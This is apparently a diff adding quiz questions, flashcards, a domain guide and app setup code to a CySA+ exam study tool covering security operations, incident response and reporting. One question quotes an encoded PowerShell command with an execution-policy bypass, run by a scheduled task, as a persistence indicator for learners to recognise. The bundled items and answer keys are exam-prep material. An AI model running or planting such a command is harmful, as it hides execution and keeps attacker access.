+{q:"An analyst identifies that an attacker used Pass-the-Hash to authenticate as a domain admin. The IMMEDIATE containment action is:",o:["Run antivirus scans", "Disable the compromised domain admin account, invalidate all its active sessions (including Kerberos tickets), and rotate the KRBTGT account password", "Reimage all servers", "Notify all users"],a:1,d:3,e:"Pass-the-Hash uses NTLM hashes for authentication — the attacker doesn't need the plaintext password. Containment: disable the account (stops new authentications), invalidate active tokens, and rotate KRBTGT (invalidates all existing Kerberos tickets, forcing re-authentication). KRBTGT rotation must be done twice to fully invalidate old tickets. This is urgent because domain admin access means complete domain compromise."},
+{q:"Which order correctly represents the Lockheed Martin Kill Chain?",o:["Delivery → Reconnaissance → Weaponization → Installation → Exploitation", "Reconnaissance → Weaponization → Delivery → Exploitation → Installation → Command & Control → Actions on Objectives", "Exploitation → Delivery → Reconnaissance → C2 → Installation", "Installation → Exploitation → Delivery → Weaponization → Reconnaissance"],a:1,d:3,e:"Kill Chain (Lockheed Martin, 2011): 1.Reconnaissance, 2.Weaponization, 3.Delivery, 4.Exploitation, 5.Installation, 6.Command & Control, 7.Actions on Objectives. Each phase represents an opportunity to detect and stop the attack. Earlier phase interdiction (blocking delivery) is more effective than later phase interdiction (detecting actions on objectives after data is already stolen)."},
+{q:"During malware analysis, an analyst executes suspicious code in an isolated virtual machine. This analysis technique is called:",o:["Static analysis — examining code without running it", "Dynamic analysis / sandboxing — executing malware in a controlled environment to observe behavior", "Fuzzing", "Reverse engineering"],a:1,d:3,e:"Dynamic analysis executes malware in a sandbox (isolated VM with monitoring tools) to observe: files created/modified, registry changes, network connections made, processes spawned, and API calls. This reveals actual malware behavior rather than attempting to infer it from code analysis. Cuckoo Sandbox, Any.run, and Joe Sandbox automate this process. The tradeoff: some malware detects VMs and behaves differently."},
+{q:"Which evidence type is MOST volatile and must be collected FIRST during incident response?",o:["Hard drive image", "Network traffic logs", "RAM contents — running processes, network connections, and decrypted data are lost when the system powers off", "Log files"],a:2,d:3,e:"Order of volatility (most to least volatile): CPU registers/cache → RAM → Network state → Running processes → Disk → Removable media. RAM contains the richest volatile evidence: running malware code, decrypted communications, injected shellcode, and live network connections. After reboot or shutdown, this evidence is permanently gone. Capture RAM before anything else in an incident involving suspected malware."},
+{q:"Which step MUST occur before eradicating malware from a compromised system?",o:["Restoring from backup", "Documenting and collecting forensic evidence — evidence collection before eradication preserves what the investigation needs", "Notifying law enforcement", "Rebuilding the system"],a:1,d:3,e:"Eradication (removing malware, cleaning systems) destroys evidence. Forensic collection must precede eradication: disk image, memory dump, relevant log files, network captures. If the incident may result in prosecution or litigation, evidence must be forensically sound. Even for non-legal cases, evidence collection captures indicators needed for hunting across other systems and building better detections."},
+{q:"A ransomware attack encrypts files on 5 servers. Before restoring from backups, what should the IR team verify?",o:["Nothing — restore immediately", "That the backups are clean (not infected), that the infection vector is identified and closed, and that all attacker persistence mechanisms are removed", "That the ransom demand is legitimate", "That all users are notified"],a:1,d:3,e:"Restoring infected backups re-infects cleaned systems. The infection vector must be closed (patch, credential rotation) or ransomware returns immediately. All persistence must be found and removed or the attacker re-encrypts from their foothold. Verify backup integrity before restore. This verification takes time but prevents the nightmare of re-encryption after a long, expensive recovery."},
+{q:"Which phase of incident response involves VERIFYING that a suspected incident actually occurred versus a false positive?",o:["Preparation", "Detection and Analysis — confirming indicators represent a real incident before resource-intensive response", "Containment", "Post-Incident Activity"],a:1,d:3,e:"Detection and Analysis phase: validate that alerts represent a real incident. Many alerts are false positives — verifying before escalating prevents wasted IR effort. Triage involves: corroborating indicators from multiple sources, reviewing context (is this normal for this system?), checking threat intelligence, and applying the incident classification criteria. Only confirmed incidents proceed to full IR."},
+{q:"Which legal concept requires organizations to preserve all potentially relevant data when litigation is reasonably anticipated?",o:["Chain of custody", "Legal hold — suspending normal data retention/deletion policies to preserve evidence for potential litigation", "Privacy by design", "Data minimization"],a:1,d:3,e:"Legal hold (litigation hold) requires preserving all potentially relevant electronically stored information (ESI) when litigation is reasonably anticipated — even before a lawsuit is filed. Normal deletion schedules must be suspended. Failure to preserve results in spoliation sanctions. During an incident, if criminal prosecution or civil litigation is possible, legal hold must be implemented immediately across all relevant systems."},
+{q:"Which attack uses a previously compromised legitimate website to infect visitors who match a specific target profile?",o:["Phishing", "Watering hole attack — compromising sites frequented by the target population, waiting for targets to visit", "Drive-by download", "Business email compromise"],a:1,d:3,e:"Watering hole attacks compromise websites frequently visited by the target population (e.g., an industry trade association's website visited by aerospace defense employees). The attackers inject malicious code that exploits visitors' browsers. Only targets matching the profile (e.g., specific IP ranges, browser language) are attacked. This bypasses email security and targets even security-aware users who don't click phishing emails."},
+{q:"During incident response, a compromised account used to move laterally should have its password changed using which approach?",o:["Change password only", "Disable account, invalidate all sessions and tokens, rotate the password, and enable MFA if not already present — then re-enable when safe", "Ask the user to change their password", "Send a password reset email"],a:1,d:3,e:"Compromised credential containment requires: disable (immediately stop any use), session invalidation (kill active sessions — not just password change, which doesn't terminate existing sessions), password rotation (new credential unknown to attacker), MFA enablement (raise the bar for future compromise). Just changing a password leaves active sessions live and doesn't prevent immediate re-authentication using cached credentials."},
+{q:"Which technical control reduces the impact of a successful phishing attack targeting employee credentials?",o:["Security awareness training only", "Phishing-resistant MFA (FIDO2/WebAuthn) — makes credential theft insufficient for account compromise", "Password complexity requirements", "Email filtering alone"],a:1,d:3,e:"Even if credentials are phished, phishing-resistant MFA (FIDO2/hardware keys) prevents account takeover because the second factor is domain-bound — a phishing site can't use it. Traditional MFA (SMS, TOTP) can be bypassed by real-time phishing proxies that relay the OTP. FIDO2 is cryptographically bound to the legitimate domain, making it impossible to use on a phishing site. This is the most effective single control against credential phishing."},
+{q:"Which activity during the recovery phase ensures that the restored environment doesn't contain residual attacker access?",o:["Restoring from backup", "Integrity verification — scanning restored systems for malware, comparing file hashes, and verifying configurations before reconnecting", "Updating AV signatures only", "Notifying users"],a:1,d:3,e:"Recovery without verification may re-introduce compromised files or configurations from backups taken during the infection window. Integrity verification: scan with updated AV, compare critical file hashes to known-good baselines, verify system configurations match security baselines, test for attacker persistence mechanisms. Only after verification should systems be reconnected to the production network."},
+{q:"Which framework provides detailed guidance specifically for responding to cybersecurity incidents in industrial control systems?",o:["NIST 800-61 only", "ICS-CERT guidelines and NIST 800-82 — OT/ICS-specific guidance addressing safety-critical response considerations", "PCI DSS", "ISO 27001"],a:1,d:3,e:"OT/ICS incident response has unique considerations: physical safety implications of disruption, longer maintenance windows, legacy systems that can't run traditional IR tools, and operational continuity requirements. ICS-CERT provides ICS-specific guidance. NIST 800-82 addresses ICS security. General IR frameworks (800-61) apply but must be adapted for OT/ICS constraints and safety requirements."},
+{q:"An analyst notices a scheduled task running 'cmd.exe /c powershell -ep bypass -enc <base64>' at 3 AM daily. This MOST likely indicates:",o:["Normal Windows maintenance", "Scheduled task persistence — an attacker installed a scheduled task as a persistence mechanism to maintain access", "Windows Update", "Antivirus scan"],a:1,d:3,e:"Attacker persistence via scheduled tasks: creates a task that runs malicious code at scheduled intervals. The encoded PowerShell (-enc = encoded command) bypasses execution policy (-ep bypass) and hides the actual command. 3 AM timing avoids analyst observation. Scheduled task forensics: examine Task Scheduler event logs (Event ID 4698 = task created), task XML files in C:\\Windows\\System32\\Tasks\\."},
+{q:"Which section of a vulnerability management report would MOST help a CISO justify budget for additional remediation resources?",o:["List of CVE numbers", "Risk exposure trend showing increasing unpatched critical vulnerabilities over time — demonstrating growing business risk without additional investment", "Technical patch instructions", "Scan completion statistics"],a:1,d:4,e:"CISOs justify budget by demonstrating risk. A trend showing growing unpatched critical vulnerabilities with financial impact quantification (potential breach cost, regulatory exposure) makes the business case. CVE lists and technical details don't resonate with financial decision-makers. Risk trending shows the consequence of inaction in terms that justify investment."},
+{q:"Which metric BEST demonstrates the operational effectiveness of a SOC to executive leadership?",o:["Number of alerts processed per analyst", "MTTD and MTTR trends over time — showing the SOC is detecting and containing threats faster", "Number of security tools deployed", "Security training completion rates"],a:1,d:4,e:"MTTD (Mean Time to Detect) and MTTR (Mean Time to Respond) are outcome metrics that demonstrate actual security effectiveness. Improving trends show the SOC is getting better at its core mission. Volume metrics (alerts processed) measure activity, not outcomes. Executive leaders make resource decisions based on whether the investment is improving actual security posture."},
+{q:"A security analyst discovers that a compliance scan shows all controls are passing but a penetration test reveals critical vulnerabilities. This discrepancy should be communicated as:",o:["The compliance scan is sufficient", "Compliance ≠ Security — a critical finding to present to leadership demonstrating that compliance controls are necessary but not sufficient for actual security", "The penetration test is wrong", "Both are valid independently"],a:1,d:4,e:"Compliance scans check whether specific controls are in place; they don't test whether those controls actually work against real attacks. A pentest showing critical vulnerabilities in a 'compliant' environment reveals this gap. This is an important executive communication: meeting compliance requirements is the floor, not the ceiling, of security. It often drives investment in security beyond minimum compliance requirements."},
+{q:"Which format is MOST appropriate for communicating a security incident to the board of directors?",o:["Full technical incident report with IOCs and PCAP analysis", "Executive summary: business impact, timeline, data affected, regulatory implications, and remediation actions — without technical jargon", "Detailed forensic analysis report", "Vendor security advisory"],a:1,d:4,e:"Board communications: what happened (in business terms), what data was affected, what the business impact is, what regulatory obligations exist, what actions were taken, and what prevents recurrence. No PCAP analysis, CVE numbers, or technical details. The board needs enough information to fulfill their governance responsibilities and make resource decisions — not enough to rebuild the technical environment."},
+{q:"Which communication principle ensures that sensitive incident information is shared appropriately within the organization?",o:["Share everything with everyone for transparency", "Need-to-know distribution — sharing incident details only with stakeholders who require the information to perform their response role", "Publish in the company newsletter", "Encrypt all communications"],a:1,d:4,e:"Incident communications follow need-to-know: technical details to IR team, management summary to affected business unit leaders, legal implications to legal/compliance, regulatory notice to privacy officer, public statement to PR. Over-sharing creates liability (premature disclosure), tipping off attackers, and employee panic. Under-sharing slows response. Structured communication templates with different detail levels for different audiences implement this."},
+{q:"An organization's SLA requires critical vulnerability patches within 7 days of discovery. A report shows 40% of critical patches are applied within SLA. This finding should be communicated to:",o:["Only the security team", "Both the security team AND business leadership — SLA breach at this scale indicates systemic process failure requiring management attention and resource allocation", "Only IT operations", "Only the CISO"],a:1,d:4,e:"40% SLA compliance is a systemic failure, not an individual exception. Management must know: the organization faces materially elevated risk from unpatched critical vulnerabilities, the process is failing consistently, and resource or process changes are needed. Keeping this in the security team prevents necessary organizational changes. Leadership visibility drives accountability and resource allocation."},
+{q:"Which communication channel is MOST appropriate for notifying affected customers after a confirmed data breach?",o:["Social media announcement first", "Direct customer notification through verified official channels (email from official domain, notification in account portal) following legal counsel guidance on required content and timing", "Press release only", "No notification until investigation is complete"],a:1,d:4,e:"Breach notification requirements (GDPR, CCPA, state laws) specify direct notification to affected individuals through verifiable channels. Social media is insufficient — not everyone follows company accounts. Official email and account portal notifications reach affected users directly. Legal counsel determines: required content (what data, when, what to do), timing (state laws vary: 30-72 hours to 90 days), and which regulators must also be notified."},
+{q:"A security team discovers a critical vulnerability in a competitor's product that they use internally. Before patching, the analyst should:",o:["Publicly post the vulnerability on social media", "Coordinate internal patching, notify the vendor through responsible disclosure, and follow internal incident handling procedures if already exploited", "Ignore it since it's the vendor's problem", "Sell the vulnerability information"],a:1,d:4,e:"Internal discovery of a vendor vulnerability: patch internally first (protect the organization), then notify the vendor through responsible disclosure channels. Premature public disclosure harms all users of the product. The vendor needs time to develop and test a patch before broad disclosure. Standard practice: 90-day disclosure deadline (Google Project Zero model), coordinated public disclosure when patch is available."},
+{q:"Which type of security report compares the organization's current security posture against the controls required by a specific framework like NIST CSF or ISO 27001?",o:["Penetration test report", "Gap analysis / maturity assessment report — identifying which required controls are missing, partially implemented, or fully implemented", "Incident response report", "Vulnerability scan report"],a:1,d:4,e:"Gap analysis compares current state (what controls exist) against target state (what the framework requires). Each control is assessed: Not Implemented, Partially Implemented, or Fully Implemented. The output is a prioritized roadmap to achieve the target maturity level. This is the foundational document for security program planning and compliance projects."},
+{q:"An analyst must report the financial impact of a ransomware incident. Which components should be included?",o:["Only the ransom demand amount", "Total cost including: ransom payment (if paid), incident response costs, business downtime, data recovery, regulatory fines, legal fees, customer notification, and reputation impact", "Only the IR team hours", "Only the cost to restore systems"],a:1,d:4,e:"Total cost of a breach encompasses many components beyond the obvious. Organizations often underestimate true cost by focusing only on immediate recovery. Full cost accounting: IR fees (external firm), forensics, business interruption (revenue lost per day × downtime), ransom (if paid), notification costs, legal fees, regulatory fines, customer churn from reputation damage. This total figure is used for insurance claims, board reporting, and ROI calculations for future security investments."}
+];
+
+// ── CySA+ FLASHCARDS ─────────────────────────────────────────────────────────
+var FLASH_CARDS=[
+{front:"SIEM",back:"Security Information and Event Management — aggregates logs from multiple sources, normalizes them, and applies correlation rules to detect threats. Provides centralized visibility. Examples: Splunk, Microsoft Sentinel, IBM QRadar."},
+{front:"SOAR",back:"Security Orchestration, Automation, and Response — automates repetitive SOC tasks (alert triage, threat intel enrichment, ticket creation) and coordinates response actions across tools. Reduces analyst workload and response time."},
+{front:"EDR",back:"Endpoint Detection and Response — provides continuous monitoring, recording, and analysis of endpoint activity. Detects behavioral threats (process injection, credential dumping) that traditional AV misses. Enables threat hunting and remote remediation."},
+{front:"NDR",back:"Network Detection and Response — monitors network traffic for malicious activity using behavioral analysis and ML. Detects lateral movement, C2 traffic, and data exfiltration that endpoint tools miss."},
+{front:"UEBA",back:"User and Entity Behavior Analytics — establishes behavioral baselines per user and entity, flags statistical anomalies. Detects insider threats and compromised accounts using legitimate credentials. Often integrated into SIEM."},
+{front:"MITRE ATT&CK",back:"Adversarial Tactics, Techniques, and Common Knowledge — knowledge base of real-world adversary behaviors organized by tactic (why) and technique (how). Used for threat hunting, detection engineering, red/blue team exercises, and gap analysis."},
+{front:"Pyramid of Pain",back:"Framework showing relative difficulty for attackers if defenders detect and block each indicator type. Bottom (easy to change): Hash values, IP addresses. Middle: Domain names, Network artifacts, Host artifacts. Top (hardest): Tools, TTPs."},
+{front:"Diamond Model",back:"Intrusion analysis framework with 4 features: Adversary, Capability, Infrastructure, Victim. Analysts pivot between features to understand campaigns and attribute attacks. Meta-features: timestamp, phase, result, direction."},
+{front:"Kill Chain",back:"Lockheed Martin: 7 phases of an attack — Reconnaissance, Weaponization, Delivery, Exploitation, Installation, Command & Control, Actions on Objectives. Each phase = interdiction opportunity. Earlier disruption = more effective defense."},
+{front:"IOC",back:"Indicator of Compromise — artifact showing a system may be compromised: file hashes, malicious IPs/domains, registry keys, mutex names. Tactical, specific, and may become stale quickly. Compare to IOA (Indicator of Attack) which describes behavior."},
+{front:"IOA",back:"Indicator of Attack — behavioral pattern indicating an attack in progress regardless of specific tools: unusual child process relationships, encoded PowerShell, LSASS access patterns. More durable than IOCs; works against novel malware."},
+{front:"STIX/TAXII",back:"STIX: format for describing cyber threat intelligence (actors, TTPs, indicators). TAXII: transport protocol for sharing STIX data between organizations and tools. Together they enable automated, standardized threat intelligence sharing."},
+{front:"TTP",back:"Tactics, Techniques, and Procedures — describes HOW an adversary operates. Tactics = goals (persistence, lateral movement). Techniques = methods (WMI event subscription). Procedures = specific implementation. TTPs are at the top of the Pyramid of Pain."},
+{front:"CVSS",back:"Common Vulnerability Scoring System — standard for rating severity of vulnerabilities. Base score (0-10) from Attack Vector, Attack Complexity, Privileges Required, User Interaction, Scope, CIA Impact. Also Temporal and Environmental scores for context."},
+{front:"EPSS",back:"Exploit Prediction Scoring System — ML-based probability (0-1) that a CVE will be exploited in the next 30 days. Complements CVSS (technical severity) with exploitation likelihood. Maintained by FIRST. High EPSS + high CVSS = top priority."},
+{front:"CISA KEV",back:"Known Exploited Vulnerabilities catalog — CISA-maintained list of CVEs with confirmed active exploitation in the wild. Federal agencies must patch KEV entries within 2-3 weeks. Highest-priority remediation regardless of CVSS score."},
+{front:"DAST",back:"Dynamic Application Security Testing — tests running web applications by sending malicious inputs. Finds: SQLi, XSS, SSRF, broken authentication. Tools: OWASP ZAP, Burp Suite. Contrast with SAST (source code analysis) and IAST (runtime instrumentation)."},
+{front:"SAST",back:"Static Application Security Testing — analyzes source code without executing it to find security flaws. Finds: hardcoded credentials, insecure functions, input validation issues. Integrated into CI/CD for shift-left security. False positive rate can be high."},
+{front:"SCA",back:"Software Composition Analysis — identifies open source libraries and checks them against vulnerability databases (NVD). Finds transitive/dependency vulnerabilities like Log4Shell. Tools: Snyk, Black Duck, OWASP Dependency Check."},
+{front:"CSPM",back:"Cloud Security Posture Management — continuously scans cloud infrastructure for misconfigurations. Finds: public S3 buckets, overpermissive IAM, unencrypted storage, missing logging. Provides compliance benchmarking against CIS and cloud-native frameworks."},
+{front:"MTTD",back:"Mean Time to Detect — average time from initial compromise to security team awareness. Global average: 200+ days for APTs. Reducing MTTD limits attacker dwell time and breach scope. Improved by threat hunting, UEBA, and better detection coverage."},
+{front:"MTTR",back:"Mean Time to Respond/Remediate — average time from detection to full resolution. In vulnerability management: time from disclosure to patch. In incident response: time from detection to containment/recovery. Lower MTTR = less business impact."},
+{front:"Threat Hunting",back:"Proactive searching for threats that automated detection missed. Assumes compromise and hunts for evidence. Hypothesis-driven: uses threat intelligence to form specific theories then tests them. Complements reactive IR."},
+{front:"OSINT",back:"Open Source Intelligence — information gathered from publicly available sources: social media, job postings, DNS records, WHOIS, Shodan, GitHub. Used by attackers for reconnaissance and defenders for threat intelligence and attack surface assessment."},
+{front:"DGA",back:"Domain Generation Algorithm — malware technique generating pseudo-random domain names to find C2 servers. Attackers pre-register one generated domain; malware tries hundreds until one resolves. Detected by: high NXDOMAIN rate, random-looking domains, statistical analysis."},
+{front:"Beaconing",back:"Regular, periodic callback from malware to C2 server to receive commands. Creates detectable timing patterns in network traffic. Sophisticated malware uses jitter (random delay variation) to blend with normal traffic. Detected by statistical analysis of connection intervals."},
+{front:"LOLBIN/LOTL",back:"Living Off the Land Binaries/Techniques — attackers use legitimate OS tools (PowerShell, certutil, WMI, PsExec) to avoid malware detection. No suspicious files dropped; blends with normal admin activity. Detected by: process behavior analysis, command-line monitoring."},
+{front:"Pass-the-Hash",back:"Attack using captured NTLM hash to authenticate without knowing plaintext password. Works against systems using NTLM authentication. Countermeasures: disable NTLM, use Kerberos, implement PAM, enable Protected Users group, deploy Windows Defender Credential Guard."},
+{front:"Golden Ticket",back:"Kerberos attack using forged Ticket Granting Tickets (TGTs) created with the KRBTGT account hash. Valid for 10 years, works even after password changes. Requires domain admin to dump KRBTGT hash. Response: rotate KRBTGT password TWICE."},
+{front:"Process Injection",back:"Injecting malicious code into a legitimate running process to hide and inherit its privileges. Types: DLL injection, process hollowing, reflective DLL injection. Target: lsass.exe (credential theft), svchost.exe (blending in). Detected by: EDR memory scanning, API hooking."},
+{front:"Lateral Movement",back:"Techniques for moving through a network after initial compromise: Pass-the-Hash, Pass-the-Ticket, WMI remote execution, PsExec, RDP, SSH. Goal: reach high-value targets (domain controllers, data stores). Detected by: internal network monitoring, authentication anomalies."},
+{front:"NIST 800-61",back:"Computer Security Incident Handling Guide. Defines 4 IR phases: Preparation, Detection & Analysis, Containment/Eradication/Recovery, Post-Incident Activity. The foundational IR framework. Supplements available for specific incident types."},
+{front:"Chain of Custody",back:"Documentation proving evidence integrity from collection through legal proceedings. Records: who collected, when, how, transfers between custodians, storage conditions. Enables legal admissibility. Cryptographic hashing proves no modification occurred."},
+{front:"Order of Volatility",back:"Evidence collection priority: CPU registers → RAM → Network state → Running processes → Disk → Removable media. Most volatile (RAM) captured first — lost on reboot. Governs IR evidence collection sequence."},
+{front:"Legal Hold",back:"Suspension of normal data retention/deletion policies when litigation is reasonably anticipated. Preserves ESI (electronically stored information) for potential legal proceedings. Failure to implement = spoliation (evidence destruction) sanctions."},
+{front:"CVSS Attack Vector",back:"Network (N): exploitable over internet — highest severity. Adjacent (A): requires same local network. Local (L): requires local access/login. Physical (P): requires physical interaction. Network-vectored vulnerabilities are highest priority."},
+{front:"CVSS Scope",back:"Scope: Changed (C) = vulnerability can affect components beyond the vulnerable one (e.g., VM escape affects host). Scope: Unchanged (U) = impact limited to the vulnerable component. Scope:Changed vulnerabilities receive higher scores."},
+{front:"Responsible Disclosure",back:"Notifying vendor of vulnerability privately before public disclosure. Standard: 90-day deadline (Google Project Zero model). Allows vendor to develop and test patch. Coordinated public disclosure when fix is available. Protects all users of the vulnerable software."},
+{front:"OSCP/Scoping Document",back:"Rules of Engagement for penetration tests. Defines: in-scope systems, permitted techniques, timing restrictions, emergency stop conditions, and contact procedures. Protects both tester and organization legally. Testing outside scope creates liability."},
+{front:"JA3/JA3S",back:"TLS fingerprinting method hashing client hello parameters (JA3) or server hello (JA3S). Identifies TLS implementations regardless of certificate. Many malware families have distinctive JA3 fingerprints. Detects C2 traffic mimicking legitimate HTTPS by identifying unusual TLS implementations."},
+{front:"Shimcache",back:"Windows Application Compatibility Cache recording metadata about executed files (path, size, last modified time). Persists after file deletion — forensic evidence of execution history. Located: HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCompatCache."},
+{front:"Prefetch",back:"Windows performance optimization caching execution data for recently-run programs (.pf files in C:\\Windows\\Prefetch). Records: executable name, run count, up to 8 last run timestamps, files referenced. Forensic evidence of execution even after file deletion."},
+{front:"WMI Persistence",back:"WMI event subscriptions creating a trigger (event filter) + handler (event consumer) pair. Executes code when specified events occur (e.g., startup). Fileless capable — consumer can run PowerShell from internet. Detected by: WMI audit logs, scanning WMI repository."},
+{front:"USBSTOR",back:"Windows registry key (HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR) recording all USB storage devices ever connected. Used in insider threat investigations to prove which USB device connected and when. Combine with DLP logs and Shellbags for complete USB forensics."},
+{front:"EPSS vs CVSS",back:"CVSS = technical severity (0-10): how bad IF exploited. EPSS = exploitation likelihood (0-1): how likely to BE exploited in 30 days. Best practice: combine both. High-EPSS/medium-CVSS may rank above low-EPSS/critical-CVSS for remediation priority."},
+{front:"False Positive Management",back:"Process of identifying and suppressing scanner findings confirmed as non-issues (e.g., patched vulnerabilities reported based on version string). Each suppression documented with justification and review date. Improves signal quality; reduces alert fatigue."},
+{front:"DMARC",back:"Domain-based Message Authentication, Reporting, and Conformance. Policy layered on SPF and DKIM that tells receiving servers what to do when checks fail: none (monitor), quarantine (spam folder), reject (block). Prevents email spoofing of your domain."},
+{front:"Threat Intelligence Platform (TIP)",back:"Centralizes threat intelligence collection, processing, analysis, and dissemination. Aggregates feeds (STIX/TAXII), enriches IOCs, manages relationships between indicators, and pushes actionable intelligence to security controls. Examples: MISP, ThreatConnect, Anomali."},
+{front:"Honeypot",back:"Decoy system designed to attract attackers and learn their techniques. High-interaction (real OS, real services) vs low-interaction (emulated). Any traffic to a honeypot is suspicious — no legitimate user should interact with it. Provides early warning and attacker intelligence."},
+{front:"Playbook",back:"Documented, step-by-step IR procedures for specific incident types. Reduces response time and ensures consistent handling. Covers: detection criteria, escalation paths, containment steps, evidence collection, communication, and post-incident actions. Should be practiced via tabletop exercises."}
+];
+
+// ── DOMAIN GUIDE ────────────────────────────────────────────────────────────
+var DOMAIN_GUIDE={
+1:"<h3>Security Operations (33%)</h3><p><b>Log Analysis:</b> Windows Event IDs — 4624 (logon success), 4625 (logon fail), 4688 (process create), 4698 (scheduled task created), 4720 (account created). Sysmon Event ID 1 (process create with command line), 3 (network connection), 7 (image load), 10 (process access to LSASS).</p><p><b>Network Monitoring:</b> Beaconing = regular intervals to C2. DGA = flood of NXDOMAIN for random domains. DNS tunneling = long subdomain labels, TXT queries, high frequency to one domain. JA3 = TLS fingerprinting to identify malicious client implementations.</p><p><b>Threat Hunting:</b> Hypothesis-driven — form a specific theory based on threat intel then test it. Data sources: EDR telemetry, SIEM logs, network captures. Key behaviors to hunt: LOLBIN use (certutil, wscript, mshta), WMI persistence, scheduled tasks, unusual parent-child process relationships.</p><p><b>MITRE ATT&CK Tactics:</b> Reconnaissance → Resource Development → Initial Access → Execution → Persistence → Privilege Escalation → Defense Evasion → Credential Access → Discovery → Lateral Movement → Collection → Command & Control → Exfiltration → Impact.</p><p><b>Key Tools:</b> SIEM (correlation, alerting), EDR (endpoint behavior), NDR (network behavior), UEBA (user anomalies), SOAR (automation), Wireshark (PCAP analysis), Zeek/Bro (network logging).</p><p><b>Threat Actor Types:</b> Nation-state APT (zero-days, custom malware, long dwell time, specific targets), Cybercriminal (ransomware, financial motivation), Hacktivist (ideology, DDoS, defacement), Insider (legitimate access, motivation varies), Script kiddie (commodity tools, opportunistic).</p>",
+2:"<h3>Vulnerability Management (30%)</h3><p><b>CVSS v3 Metrics:</b> Attack Vector (N/A/L/P), Attack Complexity (L/H), Privileges Required (N/L/H), User Interaction (N/R), Scope (U/C), Confidentiality/Integrity/Availability Impact (N/L/H). Network + None + None + None + Changed = maximum base score.</p><p><b>Prioritization Framework:</b> CVSS (technical severity) + EPSS (exploitation probability) + CISA KEV (confirmed exploitation) + Asset criticality + Exposure (internet-facing?) + Existing controls = actual risk priority. Never use CVSS alone.</p><p><b>Scanning Types:</b> Credentialed/authenticated scans (most thorough — examines actual patch state), unauthenticated scans (attacker perspective), DAST (web application testing), SAST (source code analysis), SCA (dependency vulnerability scanning), CSPM (cloud misconfiguration scanning).</p><p><b>Risk Treatment:</b> Remediate (patch/fix), Mitigate with compensating controls (WAF, network isolation, monitoring), Accept (document formal risk acceptance with owner signature), Transfer (cyber insurance). ALL exceptions require documentation with business justification, compensating controls, risk owner, and review date.</p><p><b>Key Regulations:</b> PCI DSS Req 11.3: quarterly internal scans + quarterly ASV external scans. HIPAA: periodic risk assessments. GDPR: appropriate technical measures (vulnerability management implied). NIST 800-53 RA controls: risk assessment requirements.</p><p><b>Vulnerability Lifecycle:</b> Discovery (scan/report) → Validation (confirm real vs false positive) → Prioritization (risk-based) → Remediation (patch/mitigate) → Verification (rescan to confirm fix) → Reporting (metrics and trending).</p>",
+3:"<h3>Incident Response & Management (20%)</h3><p><b>NIST 800-61 Phases:</b> 1. Preparation (plan, tools, training, playbooks, tabletops). 2. Detection & Analysis (validate, classify, scope). 3. Containment, Eradication, Recovery (isolate, remove, restore). 4. Post-Incident Activity (lessons learned, improvements).</p><p><b>Order of Volatility:</b> CPU registers → RAM → Network connections → Running processes → Disk → Removable media → Backups. Collect most volatile FIRST — RAM lost on reboot. Critical in incidents with memory-resident malware.</p><p><b>Attack Frameworks:</b> Kill Chain (7 linear phases, good for understanding attack progression). MITRE ATT&CK (comprehensive, technique-level, based on real attacks, best for detection and hunting). Diamond Model (adversary/capability/infrastructure/victim — good for attribution and intelligence).</p><p><b>Containment Strategies:</b> Network isolation (disconnect from network, keep powered on to preserve RAM). Forensic image before any changes. Full shutdown only if no forensic collection is needed. Never reimage before evidence collection. Verify backups are clean before restore.</p><p><b>Key Forensic Artifacts:</b> RAM (running processes, network state, decrypted data, injected code), NTFS MFT ($MFT records all file activity), Windows Event Logs (security, system, application, Sysmon), Prefetch/Shimcache (execution history), Registry (persistence, user activity), Browser artifacts (history, downloads, cookies).</p><p><b>Legal Considerations:</b> Legal hold (preserve ESI when litigation anticipated). Chain of custody (document all evidence handling). Forensically sound (hash before/after to prove integrity). Attorney-client privilege (involve legal counsel early). Mandatory breach notification (GDPR 72hrs, state laws vary).</p>",
+4:"<h3>Reporting & Communication (17%)</h3><p><b>Audience-Appropriate Communication:</b> Executives/Board: business risk, financial impact, regulatory exposure, strategic recommendations — no CVE numbers. IT/Security: technical details, reproduction steps, remediation instructions. Legal: breach notification obligations, evidence preservation. Business units: process changes affecting operations. Regulators: required format and timeline per applicable law.</p><p><b>Key Metrics:</b> MTTD (Mean Time to Detect — from compromise to awareness). MTTR (Mean Time to Respond/Remediate). SLA compliance rate (% of vulnerabilities patched within defined timeline). Risk exposure trend (are critical unpatched vulnerabilities increasing or decreasing?). False positive rate (detection quality indicator).</p><p><b>Responsible Disclosure:</b> Notify vendor privately. Allow reasonable remediation time (90-day standard). Coordinate public disclosure with vendor when patch available. Document the timeline. Full public disclosure after deadline regardless of patch status. Protects all users by giving vendors time to fix before attackers know.</p><p><b>Breach Notification:</b> GDPR Article 33: supervisory authority within 72 hours of awareness. Article 34: affected individuals when high risk. HIPAA: individuals within 60 days, HHS notification requirements. US state laws: vary 30-90 days. Involve legal counsel to determine applicable requirements before drafting notification.</p><p><b>Report Types:</b> Vulnerability scan report (technical findings for remediation teams), Executive summary (risk posture for leadership), Gap analysis (current vs target maturity), Lessons learned (post-incident improvements), Metrics/dashboard (ongoing operational status), Compliance report (control effectiveness against framework).</p>"
+};
+
+
+// ── CySA+ STUDY HUB APP ────────────────────────────────────────────────────
+var DOMAIN_NAMES={1:"Security Operations",2:"Vulnerability Management",3:"Incident Response & Management",4:"Reporting & Communication"};
+var DOMAIN_WEIGHTS={1:33,2:30,3:20,4:17};
+var DOMAIN_COLORS={1:"var(--cy)",2:"var(--or)",3:"var(--rd)",4:"var(--pu)"};
+var DOMAIN_BG={1:"var(--cy0)",2:"var(--or0)",3:"var(--rd0)",4:"var(--pu0)"};
+var PASS_SCORE=750;
+var EXAM_Q=85;
+var EXAM_SECS=9900; // 165 min
+
+function shuffle(a){var arr=[].concat(a),i=arr.length,j,t;while(i--){j=Math.floor(Math.random()*(i+1));t=arr[i];arr[i]=arr[j];arr[j]=t;}return arr;}
+
+var S={
+  tab:"home",
+  quiz:{dom:0,idx:0,qs:[],sel:null,checked:false,score:0,total:0},
+  exam:{qs:[],cur:0,ans:{},flagged:[],started:false,done:false,timer:EXAM_SECS,iv:null,ngb:false,optMaps:[]},
+  stats:JSON.parse(localStorage.getItem("cysa_stats")||'{"sessions":0,"correct":0,"total":0,"streak":0,"lastDate":"","domainScores":{}}'),
+  dark:localStorage.getItem("cysa_dark")==="1"
+};
+if(S.dark)document.body.setAttribute("data-theme","dark");
+
+function save(){try{localStorage.setItem("cysa_stats",JSON.stringify(S.stats));}catch(e){}}
